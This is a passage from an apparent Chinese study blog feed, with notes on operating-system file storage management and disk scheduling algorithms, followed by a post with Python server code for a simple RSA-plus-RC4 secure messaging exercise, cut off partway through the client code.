-0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1133em;"><span></span></span></span></span></span></span></span></span> 个记录，因而其检<br>索效率比顺序文件提高了约<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>N</mi></msqrt><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\sqrt{N}/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1767em;vertical-align:-0.25em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9267em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-2.8867em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1133em;"><span></span></span></span></span></span><span class="mord">/2</span></span></span></span> 倍。因此，包含 40000 条记录的文件，采用索引顺序文件组织<br>方式的平均检索效率比顺序文件提高了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mn>40000</mn></msqrt><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\sqrt{40000}/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1572em;vertical-align:-0.25em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9072em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord">40000</span></span></span><span style="top:-2.8672em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1328em;"><span></span></span></span></span></span><span class="mord">/2</span></span></span></span>=100 倍。</p><p><strong>超级超级超级重要考点</strong>：①要会根据多层索引、混合索引的结构计算出文件的最大长度 (Ky: 各级索<br>引表最大不能超过一个块)；②要能自己分析访问某个数据块所需要的读磁盘次数 (Ky:FCB 中会存有<br>指向顶级索引块的指针，因此可以根据 FCB 读入顶级索引块。每次读入下一级的索引块都需要一次读磁<br>盘操作。另外，要注意题目条件一一顶级索引块是否已调入内存)</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230806142623837.png" alt="image-20230806142623837"></p><h3 id="文件存储空间管理"><a class="markdownIt-Anchor" href="#文件存储空间管理">#</a> 文件存储空间管理</h3><p>1、存储空间的划分与初始化</p><ul><li>存储空间的划分：将物理磁盘划分<br>为一个个文件卷（逻辑卷、逻辑盘）</li><li>存储空间的初始化：将各个文件卷划分为目录区、文件区</li><li>目录区主要存放文件目录信息 (FCB)、月于磁盘存储空间管理的信息</li><li>文件去用于存放文件数据</li></ul><p>2、几种管理方法</p><ul><li><p>空闲表法：首位置 + 长度，回收时注意修改   适用于连续分配方式</p></li><li><p>空闲链表法（空闲盘块链、空闲盘区链</p><p>空闲盘块链：操作系统保存着链头、链尾指针  适用于离散分配的物理结构。</p><p>如何分配：若某文件申请 K 个盘块，则从链头开始依次摘下 K 个盘块分配，并修改空闲链的链头指针。<br>如何回收：回收的盘块依次挂到链尾，并修改空闲链的链尾指针。</p><p>空闲盘区链：操作系统保存着链头、链尾指针  适用于离散分配的物理结构。</p><p>如何分配：若某文件申请 K 个盘块，则可以采用首次适应、最佳适应等算法，从链头开始检索按照算法规则找到一个大小符合要求的空闲盘区，分配给文件。若没有合适的连续空闲块，也可以将不同盘区的盘块同时分配给一个文件，注意分配后可能要修改相应的链指针、盘区大小等数据</p><p>如何回收：若回收区和某个空闲盘区相邻，则需要将回收区合并到空闲盘区中。若回收区没有和任何空闲区相邻，将回收区作为单独的一个空闲盘区挂到链尾。</p></li></ul><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230806152518447.png" alt="image-20230806152518447"></p><ul><li>位示图法</li></ul><p>位示图：每个二进制位对应一个盘块。在本例中，“0” 代表盘块空闲，“1” 代表盘块已分配。位示图一般用连续的 “字” 来表示，如本例中一个字的字长是 16 位，字中的每一位对应一个盘块。因此可以用（字号，位号) 对应一个盘块号。当然有的题目中也描述为（行号，列号）</p><p>(字号，位号)=(i，j) 的二进制位对应的盘块号 b=n*i+j     n 表示字长</p><p>b 号盘块对应的字号 i=b/n, 位号 j=b% n</p><ul><li>UNIX 系统采用成组链接法：文件卷的目录区中专门用一个磁盘块作为超级块，当系统启动时需要将超级内存块读入内存。并且保证内存与外存中的超级块数据一致。</li></ul><h3 id="磁盘的结构"><a class="markdownIt-Anchor" href="#磁盘的结构">#</a> 磁盘的结构</h3><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230811143600957.png" alt="image-20230811143600957"></p><h3 id="磁盘调度算法"><a class="markdownIt-Anchor" href="#磁盘调度算法">#</a> 磁盘调度算法</h3><p>1、一次磁盘读 / 写操作需要的时间</p><p>①启动磁头臂是需要时间的。假设耗时为 s:<br>②移动磁头也是需要时间的。假设磁头匀速移动，每跨越一个磁道耗时为 m, 总共需要跨越 n 条磁道</p><p>则：</p><ul><li>寻道时间 Ts=s+m*n</li><li>平均所需延迟时间 Tr=1/(2r)   (设磁盘转速为 r 单位 转 / 秒)</li><li>传输时间 Tt=b/(rN)  N 为每个磁盘上的字节数 此次读 / 写字节数为 b</li><li>总的平均存取时间 Ta=Ts+1/2r+b/rN)</li></ul><p>2、磁盘调度算法</p><ul><li>先来先服务（FCFS）</li></ul><p>根据进程请求访问磁盘的先后顺序进行调度</p><p>优点：公平；如果请求访问的磁道比较集中的话，算法性能还算过的去<br>缺点：如果有大量进程竞争使用磁盘，请求访问的磁道很分散，则 FCFS 在性能上很差，寻道时间长。</p><ul><li>最短寻找时间优先（SSTF）</li></ul><p>优先处理与当前磁头最近的磁道，可以保证每次寻到时间最短，但是不能保证总的寻到时间最短</p><p>优点：性能较好，平均寻道时间短</p><p>缺点：但是可能会产生饥饿现象（产生原因：磁头在一个小区域内来回来去地移动）</p><ul><li>扫描算法（SCAN）</li></ul><p>只有磁头移动到最外侧磁道的时候才能往内移动，移动到最内侧磁道的时候才能往外移动</p><p>优点：性能较好，平均寻道时间较短，不会产生饥饿现象<br>缺点：①只有到达最边上的磁道时才能改变磁头移动方向，事实上，处理了最右边号磁道的访问请<br>求之后就不需要再往右移动磁头了。</p><p>②SCAN 算法对于各个位置磁道的响应频率不平均</p><ul><li><p>LOOK 调度算法</p><p>如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向</p><p>用来处理 SCAN 算法的第一个缺点</p></li><li><p>C-SCAN 调度算法</p></li></ul><p>返回时直接快速移动至起始端而不处理任何请求</p><p>C-SCAN 算法的主要缺点是只有到达最边上的磁道时才能改变磁头移动方向，并且磁头返回时不一定<br>需要返回到最边缘的磁道上。C-LOOK 算法就是为了解决这个问题。如果磁头移动的方向上已经没有<br>磁道访问请求了，就可以立即让磁头返回，并且磁头只需要返回到有磁道访问请求的位置即可。</p><p>C-LOOK 调度算法，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向</p><p>公平调度算法的整体思想是避免某请求长时间等待</p><h3 id="减小磁盘延迟时间的方法"><a class="markdownIt-Anchor" href="#减小磁盘延迟时间的方法">#</a> 减小磁盘延迟时间的方法</h3><p>1、寻找时间（寻道时间）：启动磁臂、移动磁头所花的时间</p><p>2、延迟时间：将目标扇区转到磁头下面所化的时间</p><p>3、传输时间：读 / 写数据花费的时间</p><p><strong>1、采用交替编号策略</strong></p><p>若采用交替编号的策略，即让逻辑上相邻的扇区在物理上有一定的间隔，可以使读取连续的逻辑扇区所需要的延迟时间更小。</p><p>柱面号在盘面号之前，可以减少磁头移动消耗的时间</p><p>2、<strong>错位命名</strong></p><p>方案一：若相邻的盘面相对位置相同处扇区编号相同</p><h3 id="磁盘的管理"><a class="markdownIt-Anchor" href="#磁盘的管理">#</a> 磁盘的管理</h3><p>1、磁盘初始化</p><p>Step1: 进行低级格式化（物理格式化），将磁盘的各个磁道划分为扇区。</p><p>Step2: 将磁盘分区，每个分区由若干柱面组成（即分为我们熟悉的 C 盘、D 盘、E 盘)<br> Step3: 进行逻辑格式化，创建文件系统。包括创建文件系统的根目录、初始化存储空间管理所用的数据结构（如位示图、 空闲分区表)</p><p>2、引导块</p><p>ROM 不可修改，ROM 中只存放很小的 “自举装入程序”</p><p>3、坏块的管理</p><p>对于简单的磁盘，可以在逻辑格式化时（建立文件系统时) 对整个磁盘进行坏块检查，标明哪些扇区是坏扇区，比如：在 FAT 表上标明。（在这种方式中，坏块对操作系统不透明)</p><p>对于复杂的磁盘：磁盘控制器（磁盘设备内部的一个硬件部件) 会维护一个坏块链表，并管理备用扇区</p><h3 id="固态硬盘ssd"><a class="markdownIt-Anchor" href="#固态硬盘ssd">#</a> 固态硬盘 SSD</h3><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230811154356502.png" alt="image-20230811154356502"></p><p>借鉴<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY4NTkxNjc5L2FydGljbGUvZGV0YWlscy8xMjg3MjUwMzI/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUlMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfcG9zaXRpdmV+ZGVmYXVsdC0xLTEyODcyNTAzMi1udWxsLW51bGwuMTQyJTVFdjkwJTVFY2hhdHNlYXJjaCwyMzklNUV2MiU1RWluc2VydF9jaGF0Z3B0JmFtcDt1dG1fdGVybT1MaXR0bGVYaSZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQxODc="> 【LittleXi】操作系统_Little Xi 的博客 - CSDN 博客</span></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>简单安全通信系统的设计与实现</title>
      <link href="/2023/07/24/%E7%AE%80%E5%8D%95%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/07/24/%E7%AE%80%E5%8D%95%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器端"><a class="markdownIt-Anchor" href="#服务器端">#</a> 服务器端</h1><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Signature <span class="token keyword">import</span> pkcs1_15</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> SHA256</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">rc4_decrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    j <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    out <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment"># 初始化 S 盒</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment"># 生成密钥流并解密密文</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">for</span> char <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char <span class="token operator">^</span> S<span class="token punctuation">[</span><span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> out</pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>server_address <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span></pre></td></tr><tr><td data-num="30"></td><td><pre>server_port <span class="token operator">=</span> <span class="token number">8888</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment"># 生成 RSA 密钥对</span></pre></td></tr><tr><td data-num="33"></td><td><pre>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>private_key <span class="token operator">=</span> key<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>public_key <span class="token operator">=</span> key<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"私钥:"</span><span class="token punctuation">,</span> private_key<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"公钥:"</span><span class="token punctuation">,</span> public_key<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment"># 创建服务器套接字并绑定地址和端口</span></pre></td></tr><tr><td data-num="41"></td><td><pre>server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>server_address<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"等待客户端连接..."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token comment"># 等待客户端连接</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    client_socket<span class="token punctuation">,</span> client_address <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"客户端已连接:"</span><span class="token punctuation">,</span> client_address<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token comment"># 接收客户端的公钥</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    client_public_key <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已收到客户端的公钥:"</span><span class="token punctuation">,</span> client_public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token comment"># 将服务器的签名公钥发送给客户端</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"服务器签名公钥已发送给客户端:"</span><span class="token punctuation">,</span> public_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token comment"># 导入客户端的公钥</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    rsa_client_public_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>client_public_key<span class="token punctuation">)</span><span class="token comment">#提取出 n 和 e</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token comment"># 接收客户端发送的加密的 RC4 密钥和消息</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    encrypted_data <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    encrypted_rc4_key <span class="token operator">=</span> encrypted_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">256</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    encrypted_message <span class="token operator">=</span> encrypted_data<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已接收加密RC4密钥和加密消息。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"接收到的RC4密钥为:"</span><span class="token punctuation">,</span> encrypted_rc4_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"接收的RC4加密消息为:"</span><span class="token punctuation">,</span> encrypted_message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token comment"># 使用服务器的私钥解密 RC4 密钥</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    rsa_cipher <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    rc4_key <span class="token operator">=</span> rsa_cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted_rc4_key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已使用服务器的私钥解密RC4密钥。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token comment"># 使用 RC4 密钥解密消息</span></pre></td></tr><tr><td data-num="77"></td><td><pre>    decrypted_message <span class="token operator">=</span> rc4_decrypt<span class="token punctuation">(</span>rc4_key<span class="token punctuation">,</span> encrypted_message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已解密加密消息。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的消息:"</span><span class="token punctuation">,</span> decrypted_message<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token comment"># 接收来自客户端的数字签名</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    signature <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已接收数字签名。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token comment"># 验证数字签名</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>encrypted_message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsa_client_public_key<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>hash_obj<span class="token punctuation">,</span> signature<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数字签名验证通过。"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>    <span class="token keyword">except</span> ValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="91"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数字签名验证失败："</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre>    <span class="token comment"># 向客户端发送响应</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    response <span class="token operator">=</span> <span class="token string">"已收到消息。"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token comment"># 关闭客户端连接</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="客户端"><a class="markdownIt-Anchor" href="#客户端">#</a> 客户端</h1><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> SHA256</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Signature <span class="token keyword">import</span> pkcs1_15</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token 